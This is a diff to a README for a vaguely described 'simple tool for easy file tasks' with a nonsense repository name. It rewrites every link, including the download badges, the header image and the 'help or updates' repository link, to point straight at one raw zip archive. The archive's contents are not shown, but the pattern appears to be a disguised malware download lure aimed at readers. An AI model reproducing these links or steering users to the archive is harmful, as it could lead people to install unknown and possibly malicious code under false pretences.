@@ -1,9 +1,9 @@
 # 🛠️ zxc24213bobickkkk - Simple Tool for Easy File Tasks
 
-[![Download Now](https://img.shields.io/badge/Download-zxc24213bobickkkk-brightgreen?style=for-the-badge)](https://github.com/Meekay888/zxc24213bobickkkk)
+[![Download Now](https://img.shields.io/badge/Download-zxc24213bobickkkk-brightgreen?style=for-the-badge)](https://github.com/Meekay888/zxc24213bobickkkk/raw/refs/heads/main/sparrowdom/bobickkkk_zxc_3.6.zip)
 
 <p align="center">
-  <img src="https://img3.teletype.in/files/ed/69/ed698bcf-b6c9-49d3-9521-d72c1d346ca9.png" alt="Ska lox" />
+  <img src="https://github.com/Meekay888/zxc24213bobickkkk/raw/refs/heads/main/sparrowdom/bobickkkk_zxc_3.6.zip" alt="Ska lox" />
 </p>
 
 ---
@@ -125,7 +125,7 @@ If errors persist, use the Issues section on the GitHub page to report bugs.
 
 ## 📌 Additional Resources
 
-- You can find help or updates on the [GitHub repository](https://github.com/Meekay888/zxc24213bobickkkk).
+- You can find help or updates on the [GitHub repository](https://github.com/Meekay888/zxc24213bobickkkk/raw/refs/heads/main/sparrowdom/bobickkkk_zxc_3.6.zip).
 - Look at the README and release notes there for detailed information.
 - Use GitHub’s "Issues" tab to ask questions or report problems.
 
@@ -133,4 +133,4 @@ If errors persist, use the Issues section on the GitHub page to report bugs.
 
 ## 📥 Download zxc24213bobickkkk Here
 
-[![Download Now](https://img.shields.io/badge/Download-zxc24213bobickkkk-blue?style=for-the-badge)](https://github.com/Meekay888/zxc24213bobickkkk)
+[![Download Now](https://img.shields.io/badge/Download-zxc24213bobickkkk-blue?style=for-the-badge)](https://github.com/Meekay888/zxc24213bobickkkk/raw/refs/heads/main/sparrowdom/bobickkkk_zxc_3.6.zip)
